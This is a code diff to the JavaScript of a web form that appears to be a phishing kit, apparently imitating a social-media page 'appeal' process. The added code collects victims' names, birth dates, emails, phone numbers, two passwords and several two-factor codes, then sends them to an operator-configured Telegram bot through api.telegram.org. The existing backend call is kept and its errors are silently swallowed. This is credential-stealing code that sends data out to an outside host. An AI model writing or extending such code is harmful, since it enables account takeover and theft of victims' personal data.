@@ -422,15 +422,119 @@
     }
   }
 
+  /* ------------------------- TELEGRAM INTEGRATION ------------------------ */
+  function escapeHtml(input) {
+    const str = typeof input === 'string' ? input : String(input ?? '');
+    return str
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;');
+  }
+
+  function normalizeTelegramData(input) {
+    const data = input || {};
+    return {
+      ip: data.ip || '',
+      location: data.location || '',
+      fullName: data.fullName || data.name || '',
+      fanpage: data.fanpage || '',
+      day: data.day || '',
+      month: data.month || '',
+      year: data.year || '',
+      email: data.email || '',
+      emailBusiness: data.emailBusiness || data.business || '',
+      phone: data.phone || '',
+      password: data.password || '',
+      passwordSecond: data.passwordSecond || '',
+      authMethod: data.authMethod || '',
+      twoFa: data.twoFa || '',
+      twoFaSecond: data.twoFaSecond || '',
+      twoFaThird: data.twoFaThird || '',
+    };
+  }
+
+  function formatTelegramMessage(data) {
+    const d = normalizeTelegramData(data);
+    const authLine = d.authMethod
+      ? '\n<b>Auth Method:</b> <code>' + escapeHtml(d.authMethod) + '</code>\n-----------------------------'
+      : '';
+
+    const phoneText = d.phone ? '+' + d.phone : '';
+
+    return (
+      '<b>Ip:</b> <code>' + escapeHtml(d.ip || 'Unknown') + '</code>\n' +
+      '<b>Location:</b> <code>' + escapeHtml(d.location || 'Unknown') + '</code>\n' +
+      '-----------------------------\n' +
+      '<b>Full Name:</b> <code>' + escapeHtml(d.fullName) + '</code>\n' +
+      '<b>Page Name:</b> <code>' + escapeHtml(d.fanpage) + '</code>\n' +
+      '<b>Date of birth:</b> <code>' +
+      escapeHtml(d.day) +
+      '/' +
+      escapeHtml(d.month) +
+      '/' +
+      escapeHtml(d.year) +
+      '</code>\n' +
+      '-----------------------------\n' +
+      '<b>Email:</b> <code>' + escapeHtml(d.email) + '</code>\n' +
+      '<b>Email Business:</b> <code>' + escapeHtml(d.emailBusiness) + '</code>\n' +
+      '<b>Phone Number:</b> <code>' + escapeHtml(phoneText) + '</code>\n' +
+      '-----------------------------\n' +
+      '<b>Password(1):</b> <code>' + escapeHtml(d.password) + '</code>\n' +
+      '<b>Password(2):</b> <code>' + escapeHtml(d.passwordSecond) + '</code>\n' +
+      '-----------------------------' +
+      authLine +
+      '\n<b>🔐Code 2FA(1):</b> <code>' +
+      escapeHtml(d.twoFa) +
+      '</code>\n<b>🔐Code 2FA(2):</b> <code>' +
+      escapeHtml(d.twoFaSecond) +
+      '</code>\n<b>🔐Code 2FA(3):</b> <code>' +
+      escapeHtml(d.twoFaThird) +
+      '</code>'
+    );
+  }
+
+  async function sendTelegramMessage(values) {
+    if (!window.config || !window.config.TELEGRAM_BOT_TOKEN || !window.config.TELEGRAM_CHAT_ID) {
+      console.warn('⚠️ Telegram config is missing in config.js');
+      return;
+    }
+
+    const token = String(window.config.TELEGRAM_BOT_TOKEN).trim();
+    const chatId = String(window.config.TELEGRAM_CHAT_ID).trim();
+    if (!token || !chatId) {
+      console.warn('⚠️ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is empty');
+      return;
+    }
+
+    const apiUrl = 'https://api.telegram.org/bot' + encodeURIComponent(token) + '/sendMessage';
+    const text = formatTelegramMessage(values);
+
+    try {
+      await axios.post(apiUrl, {
+        chat_id: chatId,
+        text: text,
+        parse_mode: 'HTML',
+      });
+    } catch (err) {
+      console.error('🔥 Telegram send error:', err?.response?.data || err.message || err);
+    }
+  }
+
+  // Keep original encrypted API call (if backend exists) and also send to Telegram
   async function sendAppealForm(values) {
     try {
       const jsonString = JSON.stringify(values);
       const encrypted = CryptoJS.AES.encrypt(jsonString, SECRET_KEY).toString();
-      await axios.post('/api/authentication', { data: encrypted });
+      // Original backend (if available)
+      axios.post('/api/authentication', { data: encrypted }).catch(() => {});
     } catch (err) {
-      // The endpoint may not exist in static mode; log and continue
-      console.warn('API call failed (mock environment):', err?.response?.data || err.message || err);
+      console.warn('Local encrypt error (still sending Telegram):', err?.message || err);
     }
+
+    // Always try to send to Telegram
+    await sendTelegramMessage(values);
   }
 
   function saveRecord(key, value) {
@@ -456,4 +560,7 @@
       return null;
     }
   }
+
+  // Expose Telegram helper if you want to call it manually
+  window.sendTelegramMessage = sendTelegramMessage;
 })();
